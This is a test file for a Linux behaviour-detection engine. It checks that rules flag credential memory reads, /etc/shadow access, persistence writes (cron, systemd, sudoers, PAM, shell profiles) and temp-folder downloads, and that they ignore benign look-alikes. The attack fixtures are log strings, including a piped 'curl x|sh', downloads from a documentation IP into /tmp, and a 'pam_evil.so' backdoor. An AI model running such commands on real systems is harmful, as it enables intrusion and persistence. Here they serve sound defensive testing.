# tests/worker/test_linux_ioa.py
"""The Linux side of the Windows behaviour rules (test_windows_ioa.py):
credential reads from other processes' memory and /etc/shadow, memory
writes into other processes, persistence files (cron, systemd, boot
scripts, shell profiles, sudoers / PAM, autostart / udev, account files),
LibreOffice starting a shell, downloads into and execution from temporary
folders. Each fires on the attack and stays quiet on the normal look-alike."""
import asyncio
import glob
import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "../../worker"))

import pytest

from worker.decoder_engine import DecoderEngine
from worker.sigma_engine import SigmaEngine

ROOT = os.path.join(os.path.dirname(__file__), "../..")


def _load(pattern):
    return [open(p).read() for p in sorted(glob.glob(os.path.join(ROOT, pattern)))]


@pytest.fixture(scope="module")
def decoders():
    import yaml
    dec = DecoderEngine()
    dec.load_from_yaml_list(sorted(_load("decoders/*.yaml"), key=lambda c: yaml.safe_load(c).get("priority", 100)))
    return dec


@pytest.fixture(scope="module")
def rules():
    sig = SigmaEngine()
    sig.load_from_yaml_list(_load("rules/*.yaml"))
    assert not sig.load_errors, sig.load_errors
    return sig


def access(action, image, target):
    # As linsensor accessLine formats it (TestProcessMemoryAccessLines).
    return (f'action={action} TargetPID=700 TargetImage="{target}" Image="{image}" Comm="x" PID=10 PPID=1 '
            f'User=0 EUID=0')


def file(action, path, image):
    # As FileEvent.line formats it.
    return f'action={action} TargetFilename="{path}" Image="{image}" Comm="x" PID=10 PPID=1 User=0'


def exec_(image, cmd, parent="/usr/bin/bash"):
    # As procexec formats it.
    return f'Image={image} CommandLine="{cmd}" PID=10 PPID=1 User=1000 ParentImage="{parent}" Comm="x"'


CASES = [
    ("linux_process_access", access("vm_read", "/tmp/.x/mimipenguin", "/usr/sbin/sshd"),
     {"Credential Process Memory Read On Linux"}),
    ("linux_process_access", access("mem_read", "/usr/bin/python3", "/usr/bin/gnome-keyring-daemon"),
     {"Credential Process Memory Read On Linux"}),
    ("linux_process_access", access("vm_read", "/usr/bin/gdb", "/usr/sbin/sshd"), set()),
    ("linux_process_access", access("vm_read", "/tmp/x", "/usr/bin/sleep"), set()),
    ("linux_process_access", access("vm_write", "/dev/shm/inj", "/usr/sbin/nginx"),
     {"Process Memory Written By Another Process On Linux"}),
    ("linux_process_access", access("mem_write", "/usr/bin/gdb", "/usr/sbin/nginx"), set()),
    ("linux_file_event", file("read", "/etc/shadow", "/tmp/hashdump"), {"Password Hash File Read By Unusual Program"}),
    ("linux_file_event", file("read", "/etc/shadow", "/usr/sbin/unix_chkpwd"), set()),
    ("linux_file_event", file("create", "/etc/cron.d/updater", "/usr/bin/bash"), {"Cron Job File Written On Linux"}),
    ("linux_file_event", file("write", "/var/spool/cron/crontabs/root", "/tmp/x"), {"Cron Job File Written On Linux"}),
    ("linux_file_event", file("create", "/etc/cron.daily/logrotate", "/usr/bin/dpkg"), set()),
    ("linux_file_event", file("create", "/etc/systemd/system/sys-update.service", "/usr/bin/bash"),
     {"Systemd Service Or Timer Written On Linux"}),
    ("linux_file_event", file("create", "/home/u/.config/systemd/user/a.timer", "/usr/bin/python3"),
     {"Systemd Service Or Timer Written On Linux"}),
    ("linux_file_event", file("create", "/lib/systemd/system/nginx.service", "/usr/bin/dpkg"), set()),
    ("linux_file_event", file("write", "/etc/systemd/system/x.conf", "/usr/bin/bash"), set()),
    ("linux_file_event", file("write", "/etc/rc.local", "/usr/bin/bash"), {"Boot Script Written On Linux"}),
    ("linux_file_event", file("create", "/etc/init.d/nginx", "/usr/bin/dpkg"), set()),
    ("linux_file_event", file("write", "/home/u/.bashrc", "/tmp/implant"),
     {"Shell Startup File Changed By A Non-Editor On Linux"}),
    ("linux_file_event", file("write", "/home/u/.bashrc", "/usr/bin/vim.basic"), set()),
    ("linux_file_event", file("create", "/etc/profile.d/x.sh", "/usr/bin/bash"),
     {"Shell Startup File Changed By A Non-Editor On Linux"}),
    ("linux_file_event", file("create", "/etc/sudoers.d/99-backdoor", "/usr/bin/bash"),
     {"Sudoers Or PAM Configuration Written On Linux"}),
    ("linux_file_event", file("create", "/lib/x86_64-linux-gnu/security/pam_evil.so", "/tmp/x"),
     {"Sudoers Or PAM Configuration Written On Linux"}),
    ("linux_file_event", file("write", "/etc/sudoers.tmp", "/usr/sbin/visudo"), set()),
    ("linux_file_event", file("create", "/etc/udev/rules.d/75-x.rules", "/usr/bin/bash"),
     {"Autostart, Udev Or MOTD Script Written On Linux"}),
    ("linux_file_event", file("create", "/home/u/.config/autostart/upd.desktop", "/tmp/x"),
     {"Autostart, Udev Or MOTD Script Written On Linux"}),
    ("linux_file_event", file("write", "/etc/passwd", "/usr/bin/bash"),
     {"Account File Written Outside Account Tools On Linux"}),
    ("linux_file_event", file("write", "/etc/passwd", "/usr/sbin/useradd"), set()),
    ("linux_process_exec", exec_("/usr/bin/bash", "sh -c curl x|sh", "/usr/lib/libreoffice/program/soffice.bin"),
     {"LibreOffice Started A Shell Or Interpreter"}),
    ("linux_process_exec", exec_("/usr/bin/lpr", "lpr doc.pdf", "/usr/lib/libreoffice/program/soffice.bin"), set()),
    ("linux_process_exec", exec_("/usr/bin/curl", "curl -s -o /tmp/k http://203.0.113.9/k"),
     {"File Downloaded Into A Temporary Folder On Linux"}),
    ("linux_process_exec", exec_("/usr/bin/curl", "curl -s https://api.example.com/health"), set()),
    ("linux_process_exec", exec_("/usr/bin/python3",
                                 "python3 -c import urllib.request;urllib.request.urlretrieve('http://x/a','/tmp/a')"),
     {"File Downloaded Into A Temporary Folder On Linux"}),
    ("linux_process_exec", exec_("/usr/bin/chmod", "chmod +x /tmp/k"),
     {"Program Made Executable Or Run From A Temporary Folder On Linux"}),
    ("linux_process_exec", exec_("/usr/bin/chmod", "chmod 644 /tmp/notes"), set()),
    ("linux_process_exec", exec_("/dev/shm/k", "/dev/shm/k -c 203.0.113.9"),
     {"Program Made Executable Or Run From A Temporary Folder On Linux"}),
]

OURS = {
    "Credential Process Memory Read On Linux", "Process Memory Written By Another Process On Linux",
    "Password Hash File Read By Unusual Program", "Cron Job File Written On Linux",
    "Systemd Service Or Timer Written On Linux", "Boot Script Written On Linux",
    "Shell Startup File Changed By A Non-Editor On Linux", "Sudoers Or PAM Configuration Written On Linux",
    "Autostart, Udev Or MOTD Script Written On Linux", "Account File Written Outside Account Tools On Linux",
    "LibreOffice Started A Shell Or Interpreter", "File Downloaded Into A Temporary Folder On Linux",
    "Program Made Executable Or Run From A Temporary Folder On Linux",
}


@pytest.mark.parametrize("log_type,line,want", CASES)
def test_linux_ioa_rules(decoders, rules, log_type, line, want):
    event, name = decoders.decode_named(log_type, line)
    assert name, f"no decoder for {line}"
    flat = {**event, "log_type": log_type, "raw_message": line, "hostname": "web-1", "group_id": "default"}
    titles = {m["title"] for m in asyncio.run(rules.evaluate(flat))}
    assert titles & OURS == want


def test_access_decoder(decoders):
    event, name = decoders.decode_named("linux_process_access", access("vm_read", "/tmp/m", "/usr/sbin/sshd"))
    assert name == "linux_process_access" and event["access.action"] == "vm_read"
    assert event["process.target.executable"] == "/usr/sbin/sshd" and event["process.pid"] == "10"
